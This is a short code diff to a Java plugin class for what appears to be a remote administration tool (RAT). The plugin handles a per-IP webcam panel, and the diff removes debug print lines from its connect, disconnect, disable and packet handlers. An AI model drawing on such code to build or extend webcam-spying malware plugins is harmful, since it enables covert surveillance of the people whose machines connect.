@@ -44,7 +44,7 @@ public class Plugin extends RATPlugin {
 	}
 
 	public void onDisable(OnDisableEvent event) throws Exception {
-		System.out.println("Disabled" + getName());
+		
 	}
 
 	public void onPacket(OnPacketEvent event) throws Exception {
@@ -52,8 +52,6 @@ public class Plugin extends RATPlugin {
 			String name = readString(event.getServer().getDataReader());
 
 			PanelWebcam panel = (PanelWebcam) Plugin.entry.instances.get(event.getServer().getIP());
-
-			System.out.println(name);
 			
 			if (name.equals("DISABLED")) {
 				enabled = false;
@@ -108,12 +106,12 @@ public class Plugin extends RATPlugin {
 
 	// Server connected to us
 	public void onConnect(OnConnectEvent event) throws Exception {
-		System.out.println("Connect: " + event.getServer().getIP());
+
 	}
 
 	// Server disconnected from us
 	public void onDisconnect(OnDisconnectEvent event) throws Exception {
-		System.out.println("Disconnect: " + event.getServer().getIP());
+
 	}
 
 	// List of right click menu items, return null if none
